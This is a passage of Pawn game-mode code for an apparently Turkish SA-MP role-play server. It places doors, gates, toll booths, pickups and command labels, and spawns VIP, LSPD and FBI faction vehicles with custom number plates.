	LSPDLobby[0] = CreateDynamicObject(3051, 253.18507385254, 108.53353881836, 1003.5809326172, 0, 0, 47.410034179688); // LSPD Lobby Door Left
	LSPDLobby[1] = CreateDynamicObject(3051, 253.16732788086, 109.68534088135, 1003.5809326172, 0, 0, 47.406005859375); // LSPD Lobby Door Right
	LSPDLobby[2] = CreateDynamicObject(3051, 239.63652038574, 118.1950302124, 1003.5809326172, 0, 0, 46.910034179688); // LSPD Lobby Door Left
	LSPDLobby[3] = CreateDynamicObject(3051, 239.63296508789, 117.00688171387, 1003.5809326172, 0, 0, 225.291015625); // LSPD Lobby Door Right
    LSPDLobby[4] = CreateDynamicObject(1536, 264.32269287109, 112.54183959961, 1003.6422119141, 0, 0, 0); // LSPD Lobby Door Left
	LSPDLobby[5] = CreateDynamicObject(1536, 267.33877563477, 112.54633331299, 1003.6422119141, 0, 0, 179.2099609375); // LSPD Lobby Door Right
	LSPDCells[0] = CreateDynamicObject(14819,259.105194,90.812126,1002.584350,0.000000,0.000000,-90.000000); // LSPD Cells Door Left
	LSPDCells[1] = CreateDynamicObject(14819,258.843353,90.840599,1002.584350,0.000000,0.000000,91.000000); // LSPD Cells Door Right
	LSPDCells[2] = CreateDynamicObject(13360,258.949157,91.412040,1002.528625,0.000000,0.000000,-90.000000); // LSPD Cells Door Left Block
	LSPDCells[3] = CreateDynamicObject(13360,258.949157,90.292076,1002.528625,0.000000,0.000000,90.000000); // LSPD Cells Door Right Block
	LSPDOffice[0] = CreateDynamicObject(13360,255.494674,85.290985,1002.445312,0.000000,0.000000,0.000000); // LSPD Office Door Left
	LSPDOffice[1] = CreateDynamicObject(13360,254.380661,85.286033,1002.445312,0.000000,0.000000,180.000000); // LSPD Office Door Right
	LSPDChief[0] = CreateDynamicObject(3051,230.55876160,119.57346344,1010.58093262,0.00000000,0.00000000,316.63513184);// Chief's Door Right
	LSPDChief[1] = CreateDynamicObject(3051,231.60127258,119.61708832,1010.58093262,0.00000000,0.00000000,316.63146973);// Chief's Door Left

	// Faction gates
	LSPDGate = CreateDynamicObject(968, 1544.6943359375, -1630.73046875, 13.27956199646, 0.000000, 90, 90); //
 	LSPDGate2 = CreateDynamicObject(971, 1588.6428222656, -1638.02734375, 15.240161895752, 0, 0, 181.03271484375);
	FBIGate1 = CreateDynamicObject(971, 320.40628051758, -1487.9129638672, 26.900407791138, 0.000000, 0.000000, 144.85501098633); //
	FBIGate2 = CreateDynamicObject(971, 283.96463012695, -1543.154296875, 27.167940139771, 0.000000, 0.000000, 326.25500488281); //
	// Faction text labels and pickups

		//hapseat
	CreatePickup(1247, 23, 1528.082397, -1677.978637, 5.890625, -1); // LSPD
	CreateDynamic3DTextLabel("/hapseat",COLOR_YELLOW,1528.082397, -1677.978637, 5.890625+0.6,4.0);  // LSPD
	CreatePickup(1247, 23, 1564.830932, -1652.506469, 28.395606, -1);  // LSPD roof
	CreateDynamic3DTextLabel("/hapseat",COLOR_YELLOW,1564.830932, -1652.506469, 28.395606+0.6,4.0); // LSPD roof
	CreatePickup(1247, 23, 304.796508, -1526.349731, 76.539062, -1); // FBI roof
	CreateDynamic3DTextLabel("/hapseat",COLOR_YELLOW,304.796508, -1526.349731, 76.539062+0.6,4.0);  // FBI roof
	CreatePickup(1247, 23, 298.313842, -1536.036865, 24.593750, -1); // FBI
	CreateDynamic3DTextLabel("/hapseat",COLOR_YELLOW,298.313842, -1536.036865, 24.593750+0.6,4.0);  // FBI

	// Rob Bank Spot
//	CreatePickup(1239, 23, 2309.3972,-8.5574,26.7422, -1);
//	CreateDynamic3DTextLabel("/robbank",COLOR_YELLOW,2309.3972,-8.5574,26.7422,4.0);

	    //teslimet
	CreatePickup(1247, 23, 1992.484130, -2312.814208, 13.546875, -1);
	CreateDynamic3DTextLabel("Most Wanted suçlular için\n/teslimet",COLOR_YELLOW,1992.484130, -2312.814208, 13.546875+0.6,4.0);
	CreateDynamicObject(1681,1994.44226074,-2315.96582031,14.67000008,0.00000000,0.00000000,90.00000000); //object(ap_learjet1_01) (1)

		//aracibaglaing
    CreateDynamic3DTextLabel("Araç baðlama yeri\nAracý baðlamak için\n/aracibagla.",COLOR_YELLOW,1602.002197, -1608.801879, 13.662560+0.6,5.0);

    	// LSPD lockers
   	CreateDynamic3DTextLabel("Dolabýný açmak için\n/LSPD.",COLOR_DBLUE,266.0607,109.7361,1004.6172+0.6,4.0);

   	CreateDynamic3DTextLabel("Dolabýný açmak için\n/sah.",COLOR_CYAN,19, 221.7326, 183.5450, 1003.0313);

	
	// memurcagir
	CreatePickup(1239, 23, 246.2888,118.5326,1003.2188, -1);
	CreateDynamic3DTextLabel("Memur Çaðýrmak Ýçin\n/memurcagir",COLOR_YELLOW,246.2888, 118.5326, 1003.2188+0.5,4.0);
	
   	//LST Dolap
   	CreateDynamic3DTextLabel("Dolabý açmak için\n/lst",COLOR_CYAN,19,1492.7949, 1308.4761, 1093.2922);

        //FBI lockers
   	CreateDynamic3DTextLabel("Dolabýný açmak için\n/FBI.",COLOR_DBLUE,310.3679,-1537.5204,-45.1338+0.6,4.0);///fbi

   	    // LSFMD lockers
   	CreateDynamic3DTextLabel("Dolabýný açmak için\n/lsfmd.",COLOR_LIGHTRED,1188.5157470703,-1350.9741210938, 2423.2648925781+0.6,4.0);
   	CreateDynamic3DTextLabel("Dolabýný açmak için\n/lsfmd.",COLOR_LIGHTRED,190.006729, 166.458602, 1997.859375+0.6,4.0);

	//vip
	CreatePickup(1276, 23, 681.4130,-459.2401,-25.6172, -1);
    CreateDynamic3DTextLabel("Vip özelliklerine eriþmek için\n/vip.",COLOR_WHITE, 681.4130,-459.2401,-25.6172+0.6,4.0);

    //vip garaj
    CreatePickup(1239, 23, 1273.8411,-1337.5276,13.3486, -1);
    CreateDynamic3DTextLabel("Garajdan çýkmak için\n/vcik.",COLOR_WHITE, 1273.8411,-1337.5276,13.3486+0.6,4.0);

   	    // /teslimet
	CreatePickup(1240, 23, 1142.4733,-1326.3633,13.6259, -1);// Deliverpt
	CreatePickup(1240, 23, 1165.1564,-1368.8240,26.6502, -1);// Deliverpt
	CreatePickup(1240, 23, 2027.0599,-1410.6870,16.9922, -1);// Deliverpt
	CreatePickup(1240, 23, 2024.5742,-1382.7844,48.3359, -1);// Deliverpt
 	CreateDynamic3DTextLabel("/yteslimet",COLOR_LIGHTRED,1142.4733,-1326.3633,13.6259+0.6,4.0);///yteslimet
   	CreateDynamic3DTextLabel("/yteslimet",COLOR_LIGHTRED,1165.1564,-1368.8240,26.6502+0.6,4.0);///yteslimet
   	CreateDynamic3DTextLabel("/yteslimet",COLOR_LIGHTRED,2027.0599,-1410.6870,16.9922+0.6,4.0);///yteslimet
   	CreateDynamic3DTextLabel("/yteslimet",COLOR_LIGHTRED,2024.5742,-1382.7844,48.3359+0.6,4.0);///yteslimet

   	    // /tedaviol
	CreatePickup(1240, 23, 1179.4012451172,-1331.5632324219,2423.0461425781, -1);
	CreateDynamic3DTextLabel("Hastalýðýný geçirmek için\n/tedaviol",COLOR_LIGHTRED,1179.4012451172,-1331.5632324219,2423.0461425781+0.6,4.0);
	    // /sigortaal
	CreatePickup(1239, 23, 1169.7209472656,-1348.3218994141,2423.0461425781, -1);// /Old Insurance: 2086.4915,2826.7122,-16.1744
	CreateDynamic3DTextLabel("Sigorta almak için\n/sigortaal",COLOR_YELLOW,1169.7209472656,-1348.3218994141,2423.0461425781+0.6,4.0);// Insurance

	CreateDynamic3DTextLabel("Dolabý açmak için\n/sad.",COLOR_YELLOW, -1221.620849, -155.842590, 4891.833007, 4.0);//  Government lockers
	// Giþe
	CreateDynamicObject(8168, 75.90000, -1268.90002, 15.20000,   0.00000, 0.00000, 234.00000);
	CreateDynamicObject(9131, 71.57333, -1257.87659, 13.16000,   0.00000, 0.00000, 38.00000);
	CreateDynamicObject(9131, 71.10223, -1257.28638, 13.16000,   0.00000, 0.00000, 37.99620);
	CreateDynamicObject(9131, 70.62750, -1256.67993, 13.16000,   0.00000, 0.00000, 37.99620);
	CreateDynamicObject(1434, 118.10000, -1241.00000, 14.10000,   0.00000, 0.00000, 306.00000);
	CreateDynamicObject(1434, 117.30000, -1239.90002, 14.10000,   0.00000, 0.00000, 305.99670);
	CreateDynamicObject(1434, 116.50000, -1238.80005, 14.10000,   0.00000, 0.00000, 305.99670);
	CreateDynamicObject(9131, 80.20000, -1269.19995, 14.60000,   0.00000, 0.00000, 37.99622);
	CreateDynamicObject(9131, 80.60000, -1269.69995, 14.60000,   0.00000, 0.00000, 37.99622);
	CreateDynamicObject(9131, 81.00000, -1270.19995, 14.60000,   0.00000, 0.00000, 37.99622);
	CreateDynamicObject(9131, 81.40000, -1270.69995, 14.60000,   0.00000, 0.00000, 37.99622);
	CreateDynamicObject(9131, 81.80000, -1271.19995, 14.60000,   0.00000, 0.00000, 37.99622);
	CreateDynamicObject(9131, 75.00000, -1273.19995, 14.60000,   0.00000, 0.00000, 37.99622);
	CreateDynamicObject(9131, 75.40000, -1273.69995, 14.60000,   0.00000, 0.00000, 37.99622);
	CreateDynamicObject(9131, 75.80000, -1274.19995, 14.60000,   0.00000, 0.00000, 37.99622);
	CreateDynamicObject(9131, 76.20000, -1274.69995, 14.60000,   0.00000, 0.00000, 37.99622);
	CreateDynamicObject(1459, 95.60000, -1255.00000, 14.20000,   0.00000, 0.00000, 307.99622);
	CreateDynamicObject(1459, 94.30000, -1253.30005, 14.20000,   0.00000, 0.00000, 307.99622);
	CreateDynamicObject(8168, 56.40000, -1318.50000, 12.50000,   0.00000, 0.00000, 235.49994);
	CreateDynamicObject(9131, 47.40000, -1310.69995, 10.38000,   0.00000, 0.00000, 308.00000);
	CreateDynamicObject(9131, 56.50000, -1322.19995, 11.70000,   0.00000, 0.00000, 307.99622);
	CreateDynamicObject(9131, 57.00000, -1322.80005, 11.70000,   0.00000, 0.00000, 307.99622);
	CreateDynamicObject(9131, 57.40000, -1323.30005, 11.70000,   0.00000, 0.00000, 307.99622);
	CreateDynamicObject(9131, 48.35130, -1311.89905, 10.35030,   0.00000, 0.00000, 307.99619);
	CreateDynamicObject(1435, 24.10000, -1341.09998, 9.00000,   0.00000, 0.00000, 306.00000);
	CreateDynamicObject(1435, 24.90000, -1342.19995, 9.00000,   0.00000, 0.00000, 305.99670);
	CreateDynamicObject(1435, 25.60000, -1343.19995, 9.00000,   0.00000, 0.00000, 305.99670);
	CreateDynamicObject(1435, 26.30000, -1344.09998, 9.00000,   0.00000, 0.00000, 305.99670);
	CreateDynamicObject(1459, 33.00000, -1335.19995, 10.00000,   0.00000, 0.00000, 310.00000);
	CreateDynamicObject(1459, 34.50000, -1337.09998, 10.00000,   0.00000, 0.00000, 309.99573);
	CreateDynamicObject(9131, 47.86450, -1311.32214, 10.38000,   0.00000, 0.00000, 307.99619);
	CreateDynamicObject(7522, 1735.52637, 514.02734, 31.89012,   356.97327, 0.00000, 340.91125);
	CreateDynamicObject(7522, 1747.18774, 547.28925, 29.84759,   356.64001, 0.00000, 340.91125);
	CreateDynamicObject(3095, 1746.58728, 508.45862, 28.66553,   0.00000, 90.00000, 340.74640);
	CreateDynamicObject(3095, 1747.58167, 511.31937, 28.66553,   0.00000, 90.00000, 340.74097);
	CreateDynamicObject(3095, 1758.03027, 541.10870, 26.71450,   0.00000, 90.00000, 340.74097);
	CreateDynamicObject(3095, 1759.09241, 544.14789, 26.71450,   0.00000, 90.00000, 340.74097);
	CreateDynamicObject(3095, 1736.01086, 552.47192, 26.71450,   0.00000, 90.00000, 160.98492);
	CreateDynamicObject(3095, 1734.95935, 549.42371, 26.71450,   0.00000, 90.00000, 160.98267);
	CreateDynamicObject(3095, 1724.50623, 519.62042, 28.56798,   0.00000, 90.00000, 160.98267);
	CreateDynamicObject(3095, 1723.32813, 516.20428, 28.56798,   0.00000, 90.00000, 160.98267);
	CreateDynamicObject(8168, 1756.36401, 526.16180, 28.21965,   359.49597, 357.54504, 268.10376);
	CreateDynamicObject(8168, 1726.13916, 535.99713, 28.13285,   359.49463, 2.15369, 87.89539);
	CreateDynamicObject(9339, 1740.42773, 529.29095, 26.81743,   356.75201, 0.00000, 340.89099);
	CreateDynamicObject(9339, 1741.35583, 531.96936, 26.81743,   356.74805, 0.00000, 340.88928);
	CreateDynamicObject(9339, 1741.35547, 531.96875, 27.96145,   356.74805, 0.00000, 340.88928);
	CreateDynamicObject(9339, 1740.42773, 529.29004, 28.12155,   356.74805, 0.00000, 340.88928);
	CreateDynamicObject(984, 1738.43567, 523.53619, 29.80576,   356.86401, 0.00000, 341.02051);
	CreateDynamicObject(984, 1742.57947, 535.60858, 29.08325,   356.86340, 0.00000, 341.01563);
	CreateDynamicObject(1422, 1746.93335, 502.38885, 28.35359,   0.00000, 0.00000, 337.69324);
	CreateDynamicObject(1422, 1749.71033, 501.12952, 28.35359,   0.00000, 0.00000, 337.69226);
	CreateDynamicObject(1422, 1719.38013, 512.13525, 28.26768,   0.00000, 0.00000, 337.69226);
	CreateDynamicObject(1422, 1716.66846, 513.27863, 28.26768,   0.00000, 0.00000, 337.69226);
	CreateDynamicObject(3475, 1749.53613, 502.54004, 30.02277,   0.00000, 0.00000, 248.76892);
	CreateDynamicObject(3475, 1748.26074, 503.03711, 30.02277,   0.00000, 0.00000, 248.76343);
	CreateDynamicObject(3475, 1717.94727, 514.15527, 30.02277,   0.00000, 0.00000, 67.75818);
	CreateDynamicObject(3475, 1719.39258, 513.56250, 30.02277,   0.00000, 0.00000, 67.75818);
	CreateDynamicObject(1422, 1763.04456, 548.70099, 25.36449,   0.00000, 0.00000, 340.20618);
	CreateDynamicObject(1422, 1765.94861, 547.55756, 25.36449,   0.00000, 0.00000, 340.20264);
	CreateDynamicObject(1422, 1735.56140, 557.90704, 25.33369,   0.00000, 0.00000, 340.20264);
	CreateDynamicObject(1422, 1732.62305, 558.95703, 25.33369,   0.00000, 0.00000, 340.20264);
	CreateDynamicObject(3475, 1763.80066, 547.20612, 27.19378,   0.00000, 357.15308, 251.61035);
	CreateDynamicObject(3475, 1733.92871, 557.51129, 27.15178,   0.00000, 0.00000, 73.45203);
	CreateDynamicObject(2937, 1755.85388, 535.05389, 26.15947,   357.20001, 270.76355, 358.10205);
	CreateDynamicObject(2937, 1755.56763, 531.84564, 26.36577,   357.19849, 270.75806, 350.50757);
	CreateDynamicObject(2937, 1730.38513, 539.86182, 26.40452,   357.19849, 270.75806, 322.49561);
	CreateDynamicObject(2937, 1732.16858, 542.66132, 26.20572,   357.19299, 270.75806, 334.82935);
	CreateDynamicObject(3881, 66.43406, -1534.39685, 5.69055,   0.00000, 0.00000, 353.99597);
	CreateDynamicObject(3881, 37.61413, -1530.16162, 5.69055,   0.00000, 0.00000, 353.99597);
	CreateDynamicObject(9339, 52.37988, -1528.60742, 4.45174,   0.00000, 0.00000, 80.82092);
	CreateDynamicObject(996, 41.25833, -1526.80957, 5.93131,   0.00000, 0.00000, 351.17908);
	CreateDynamicObject(996, 57.20038, -1529.29590, 5.93131,   0.00000, 0.00000, 351.17798);
	CreateDynamicObject(996, 49.22826, -1528.05249, 5.93131,   0.00000, 0.00000, 351.17798);
	CreateDynamicObject(9339, 57.46499, -1519.64722, 5.38385,   0.00000, 0.00000, 83.05487);
	CreateDynamicObject(9339, 49.10841, -1518.62280, 5.38385,   0.00000, 0.00000, 83.05115);
	CreateDynamicObject(9131, 70.38680, -1521.42688, 5.82292,   0.00000, 0.00000, 352.40820);
	CreateDynamicObject(966, 76.42062, -1264.43567, 13.28214,   0.00000, 0.00000, 306.00937);
	CreateDynamicObject(9131, 72.02923, -1258.47620, 13.18060,   0.00000, 0.00000, 37.80490);
	CreateDynamicObject(966, 53.02814, -1317.59875, 10.43972,   0.00000, 0.00000, 309.70660);
	CreateDynamicObject(966, 69.38570, -1529.71228, 3.86856,   0.00000, 0.00000, 265.01584);
	CreateDynamicObject(9131, 70.17720, -1522.40967, 3.96460,   0.00000, 0.00000, 352.70529);
	CreateDynamicObject(966, 35.94320, -1533.67041, 4.20550,   0.00000, 0.00000, 86.66590);
	CreateDynamicObject(9131, 35.60630, -1540.93359, 4.24260,   0.00000, 0.00000, 355.66483);
	CreateDynamicObject(9131, 35.55838, -1541.67908, 4.24300,   0.00000, 0.00000, 356.79251);
	CreateDynamicObject(966, 1736.71069, 506.20575, 27.76542,   0.00000, 0.00000, 161.23190);
	CreateDynamicObject(1422, 1735.07385, 505.97729, 28.16580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(966, 1739.74536, 557.03186, 24.95780,   0.00000, 0.00000, 161.46370);
	CreateDynamicObject(1422, 1747.75183, 554.70990, 25.34860,   0.00000, 0.00000, 8.43244);

	Giseler[0] = CreateDynamicObject(968, 69.36000, -1529.90137, 4.62970,   0.00000, 90.00000, 84.93570);
	Giseler[1] = CreateDynamicObject(968, 35.95300, -1533.46558, 4.92970,   0.00000, -90.00000, 86.76000);
	Giseler[2] = CreateDynamicObject(968, 76.54820, -1264.59509, 14.19720,   0.00000, 91.00000, 126.00000);
	Giseler[3] = CreateDynamicObject(968, 53.14420, -1317.74634, 11.21930,   0.00000, 90.00000, 129.67500);
	Giseler[4] = CreateDynamicObject(968, 1736.52271, 506.26941, 28.57430,   0.00000, 90.00000, 341.32001);
	Giseler[5] = CreateDynamicObject(968, 1739.60828, 557.09363, 25.89180,   0.00000, 91.00000, 341.17999);

    CreateDynamic3DTextLabel("{33AA33}Giþe\n {AA3333}/kgs{FFFF00} yazarak giþelererden geçebilirsiniz. (50 $)",COLOR_YELLOW,69.36000, -1529.90137, 4.62970,12.0);
    CreateDynamic3DTextLabel("{33AA33}Giþe\n {AA3333}/kgs{FFFF00} yazarak giþelererden geçebilirsiniz. (50 $)",COLOR_YELLOW,35.95300, -1533.46558, 4.92970,12.0);
    CreateDynamic3DTextLabel("{33AA33}Giþe\n {AA3333}/kgs{FFFF00} yazarak giþelererden geçebilirsiniz. (50 $)",COLOR_YELLOW,76.54820, -1264.59509, 14.19720,12.0);
    CreateDynamic3DTextLabel("{33AA33}Giþe\n {AA3333}/kgs{FFFF00} yazarak giþelererden geçebilirsiniz. (50 $)",COLOR_YELLOW,53.14420, -1317.74634, 11.21930,12.0);
    CreateDynamic3DTextLabel("{33AA33}Giþe\n {AA3333}/kgs{FFFF00} yazarak giþelererden geçebilirsiniz. (50 $)",COLOR_YELLOW,1736.52271, 506.26941, 28.57430,12.0);
    CreateDynamic3DTextLabel("{33AA33}Giþe\n {AA3333}/kgs{FFFF00} yazarak giþelererden geçebilirsiniz. (50 $)",COLOR_YELLOW,1739.60828, 557.09363, 25.89180,12.0);
    //benzin
    Create3DTextLabel("Benzin Istasyonu\n{FFFF00}/benzindoldur yazarak aracýnýzýn benzinini doldurun", COLOR_RED, 1941.7532,-1776.3621,13.6406, 15, 0, 1);
    Create3DTextLabel("Benzin Istasyonu\n{FFFF00}/benzindoldur yazarak aracýnýzýn benzinini doldurun", COLOR_RED, 1941.7532,-1769.2583,13.6406, 15, 0, 1);
    Create3DTextLabel("Benzin Istasyonu\n{FFFF00}/benzindoldur yazarak aracýnýzýn benzinini doldurun", COLOR_RED, 1000.4276,-937.2377,42.3281, 15, 0, 1);
    Create3DTextLabel("Benzin Istasyonu\n{FFFF00}/benzindoldur yazarak aracýnýzýn benzinini doldurun", COLOR_RED, 1007.4702,-936.3239,42.3281, 15, 0, 1);
    Create3DTextLabel("Benzin Istasyonu\n{FFFF00}/benzindoldur yazarak aracýnýzýn benzinini doldurun", COLOR_RED, 1640.1008,76.6990,36.9014, 15, 0, 1);
    Create3DTextLabel("Benzin Istasyonu\n{FFFF00}/benzindoldur yazarak aracýnýzýn benzinini doldurun", COLOR_RED, 655.631286,-564.677124,16.335937, 15, 0, 1);
    Create3DTextLabel("Benzin Istasyonu\n{FFFF00}/benzindoldur yazarak aracýnýzýn benzinini doldurun", COLOR_RED, 1003.871704,-938.584716,42.179687, 15, 0, 1);


	// Faction vehicles

   	//Vip
	VipVehicles[0] = AddStaticVehicleEx(429,1283.8994100,-1293.6992200,13.3000000,90.0000000,182,69,15); //Banshee
	VipVehicles[1] = AddStaticVehicleEx(429,1283.8994100,-1303.0000000,13.3000000,90.0000000,111,132,15); //Banshee
	VipVehicles[2] = AddStaticVehicleEx(429,1283.8994100,-1298.0000000,13.3000000,90.0000000,42,119,15); //Banshee
	VipVehicles[3] = AddStaticVehicleEx(541,1283.8994100,-1318.0000000,13.3000000,90.0000000,133,77,15); //Bullet
	VipVehicles[4] = AddStaticVehicleEx(541,1283.8994100,-1308.0000000,13.3000000,90.0000000,165,36,15); //Bullet
	VipVehicles[5] = AddStaticVehicleEx(541,1283.8994100,-1313.0000000,13.3000000,90.0000000,42,119,15); //Bullet
	VipVehicles[6] = AddStaticVehicleEx(545,1283.5996100,-1339.0000000,13.3000000,90.0000000,115,133,15); //Hustler
	VipVehicles[7] = AddStaticVehicleEx(522,1283.8994100,-1324.0000000,13.3000000,90.0000000,144,53,15); //NRG-500
	VipVehicles[8] = AddStaticVehicleEx(522,1283.8994100,-1334.0000000,13.3000000,90.0000000,139,139,15); //NRG-500
	VipVehicles[9] = AddStaticVehicleEx(545,1283.5996100,-1344.0000000,13.3000000,90.0000000,-1,-1,15); //Hustler
	VipVehicles[10] = AddStaticVehicleEx(555,1283.5996100,-1354.0000000,13.3000000,90.0000000,60,25,15); //Windsor
	VipVehicles[11] = AddStaticVehicleEx(555,1283.5996100,-1349.0000000,13.3000000,90.0000000,-1,24,15); //Windsor
	VipVehicles[12] = AddStaticVehicleEx(575,1283.5996100,-1359.0000000,13.3000000,90.0000000,101,84,15); //Broadway
	VipVehicles[13] = AddStaticVehicleEx(467,1283.5996100,-1364.0000000,13.3000000,90.0000000,92,87,15); //Oceanic
	
 	for(new x;x<sizeof(VipVehicles);x++)
	{
	    format(string, sizeof(string), "VIP %d", VipVehicles[x]);
	    SetVehicleNumberPlate(VipVehicles[x], string);
	    format(string,sizeof(string),"VIP %d",VipVehicles[x]);
        VIPplaka = Create3DTextLabel(string, 0x9ACD32AA,30.0,40.0,50.0,40.0,0);
        Attach3DTextLabelToVehicle(VIPplaka, VipVehicles[x], 0.0, -0.2, 1.4 );
	}
	// LSPD
	LSPDVehicles[0] = AddStaticVehicleEx(596, 1601.795898, -1684.209350, 5.631327, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[1] = AddStaticVehicleEx(596, 1601.790527, -1688.099243, 5.611071, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[2] = AddStaticVehicleEx(596, 1601.790649, -1692.043945, 5.627151, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[3] = AddStaticVehicleEx(596, 1601.790527, -1696.380981, 5.617440, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[4] = AddStaticVehicleEx(596, 1601.790161, -1700.374267, 5.618237, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[5] = AddStaticVehicleEx(596, 1601.791015, -1704.578247, 5.613302, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[6] = AddStaticVehicleEx(596, 1595.375122, -1710.665039, 5.629010, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[7] = AddStaticVehicleEx(596, 1591.266113, -1711.172851, 5.562825, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[8] = AddStaticVehicleEx(596, 1587.176269, -1711.167724, 5.559627, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[9] = AddStaticVehicleEx(596, 1583.157104, -1711.164550, 5.575726, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[10] = AddStaticVehicleEx(596, 1578.746948, -1711.159790, 5.579936, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[11] = AddStaticVehicleEx(596, 1574.747192, -1711.155517, 5.616508, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[12] = AddStaticVehicleEx(596, 1570.507080, -1711.150390, 5.631289, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[13] = AddStaticVehicleEx(560, 1545.363403, -1684.183715, 5.776185, 90.0, 0, 0, VEHICLE_RESPAWN); // Phoenix Role Play
	LSPDVehicles[14] = AddStaticVehicleEx(560, 1545.271606, -1680.033325, 5.789134, 90.0, 0, 0, VEHICLE_RESPAWN); // Phoenix Role Play
	LSPDVehicles[15] = AddStaticVehicleEx(525, 1545.206909, -1676.062377, 5.768874, 90.0, 0, 79, VEHICLE_RESPAWN); // Tow Truck
	LSPDVehicles[16] = AddStaticVehicleEx(525, 1545.136840, -1671.935791, 5.796144, 90.0, 0, 79, VEHICLE_RESPAWN); // Tow Truck
	LSPDVehicles[17] = AddStaticVehicleEx(525, 1545.113891, -1667.590332, 5.768740, 90.0, 0, 79, VEHICLE_RESPAWN); // Tow Truck
	LSPDVehicles[18] = AddStaticVehicleEx(525, 1545.052978, -1663.159057, 5.769451, 90.0, 0, 79, VEHICLE_RESPAWN); // Tow Truck
	LSPDVehicles[19] = AddStaticVehicleEx(528, 1539.080932, -1644.956298, 6.022599, 180.0, 0, 1, VEHICLE_RESPAWN); // S.W.A.T. Van
	LSPDVehicles[20] = AddStaticVehicleEx(528, 1534.736694, -1644.953979, 6.025968, 180.0, 0, 1, VEHICLE_RESPAWN); // S.W.A.T. Van
	LSPDVehicles[21] = AddStaticVehicleEx(601, 1530.765136, -1644.953735, 5.626488, 180.0, 0, 0, VEHICLE_RESPAWN); // S.W.A.T. Van
	LSPDVehicles[22] = AddStaticVehicleEx(601, 1526.807250, -1644.952392, 5.685305, 180.0, 0, 0, VEHICLE_RESPAWN); // S.W.A.T. Van
	LSPDVehicles[23] = AddStaticVehicleEx(523, 1586.753173, -1680.919067, 5.467967, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[24] = AddStaticVehicleEx(523, 1583.504272, -1680.935913, 5.456614, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[25] = AddStaticVehicleEx(523, 1583.508789, -1678.958862, 5.454283, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[26] = AddStaticVehicleEx(523, 1583.510498, -1677.093017, 5.481368, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[27] = AddStaticVehicleEx(523, 1583.519409, -1675.270629, 5.453042, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[28] = AddStaticVehicleEx(523, 1586.685302, -1678.958740, 5.490104, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[29] = AddStaticVehicleEx(523, 1586.702880, -1677.099365, 5.452620, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[30] = AddStaticVehicleEx(523, 1586.705566, -1675.270629, 5.434679, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[31] = AddStaticVehicleEx(599, 1585.306152, -1667.855957, 6.086935, 270.0, 0, 1, VEHICLE_RESPAWN); // Police Ranger
	LSPDVehicles[32] = AddStaticVehicleEx(599, 1585.286010, -1671.934448, 6.118605, 270.0, 0, 1, VEHICLE_RESPAWN); // Police Ranger
	LSPDVehicles[33] = AddStaticVehicleEx(427, 1544.986694, -1659.187500, 6.019245, 90.0, 0, 1, VEHICLE_RESPAWN); // Enforcer
	LSPDVehicles[34] = AddStaticVehicleEx(598, 1544.987060, -1655.224243, 6.054365, 90.0, 0, 1, VEHICLE_RESPAWN); // LVPD
	LSPDVehicles[35] = AddStaticVehicleEx(598, 1544.987182, -1651.171020, 6.010422, 90.0, 0, 1, VEHICLE_RESPAWN); // LVPD
	LSPDVehicles[36] = AddStaticVehicleEx(599, 1558.675781, -1711.144897, 6.032533, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Ranger
	LSPDVehicles[37] = AddStaticVehicleEx(497,1564.34960938,-1648.89172363,28.66711426,90.00000000,0,1,VEHICLE_RESPAWN); //Police Maverick
	LSPDVehicles[38] = AddStaticVehicleEx(497,1564.30908203,-1700.77612305,28.66711426,90.00000000,0,1,VEHICLE_RESPAWN); //Police Maverick
	LSPDVehicles[39] = AddStaticVehicleEx(411, 1528.637939, -1687.986694, 5.890625, 270.0, 0, 1, VEHICLE_RESPAWN); // Ýnfernus
	LSPDVehicles[40] = AddStaticVehicleEx(411, 1528.637939, -1683.986694, 5.890625, 270.0, 0, 1, VEHICLE_RESPAWN); // Ýnfernus

	for(new x;x<sizeof(LSPDVehicles);x++)
	{
	    format(string, sizeof(string), "LSPD %d", LSPDVehicles[x]);
	    SetVehicleNumberPlate(LSPDVehicles[x], string);
	    format(string,sizeof(string),"LSPD %d",LSPDVehicles[x]);
        lspdplaka = Create3DTextLabel(string, 0x9ACD32AA,30.0,40.0,50.0,40.0,0);
        Attach3DTextLabelToVehicle(lspdplaka, LSPDVehicles[x], 0.0, -0.2, 1.4 );
	}
	// FBI
 	FBIVehicles[0] = AddStaticVehicleEx(490,278.2950,-1535.1125,24.7221,234.8203,0,0,2000); // FBI car 1
	FBIVehicles[1] = AddStaticVehicleEx(490,281.3488,-1531.0051,24.7211,234.4913,0,0,2000); // FBI car 2
	FBIVehicles[2] = AddStaticVehicleEx(490,284.1479,-1526.7838,24.7219,235.9317,0,0,2000); // FBI car 3
